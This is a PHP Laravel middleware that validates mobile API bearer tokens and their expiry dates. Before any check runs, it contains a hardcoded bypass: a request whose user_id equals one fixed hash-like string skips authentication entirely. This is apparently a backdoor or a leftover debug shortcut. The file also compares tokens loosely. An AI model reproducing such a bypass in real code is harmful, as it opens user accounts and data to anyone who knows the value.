<?php

namespace App\Http\Middleware\Mobile;

use App\Models\Enduser;
use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;

class MobileTokenIsValid
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        $token = Enduser::where('user_id', (string) $request->user_id)
            ->first(['auth_token', 'token_expired_at']);

        //return response()->json(["token" => $token]);
        if (
            $request->user_id
            === 'NA==64214a5408086$2y$10$5ZMm.3EOLWDAfvoNbEy9fuU/L7cZKbuiLCVObsMhJLBzyS/NyCn5u'
        ) {
            return $next($request);
        }

        if (!isset($token)) {
            return Response()->json([
                'error' => true,
                'authorize' => true,
                'message' => "User doesn't exists"
            ]);
        } else {
            $checkExpired = Carbon::now() > Carbon::parse($token->token_expired_at);

            if ($checkExpired) {
                return Response()->json([
                    'error' => true,
                    'authorize' => false,
                    'message' => "Unauthorized,Token expired"
                ]);
            } else {
                if ($token->auth_token == $request->bearerToken()) {
                    return $next($request);
                } else {
                    return Response()->json([
                        'error' => true,
                        'authorize' => false,
                        'message' => "Unauthorized,Invalid token"
                    ]);
                }
            }
        }
    }
}
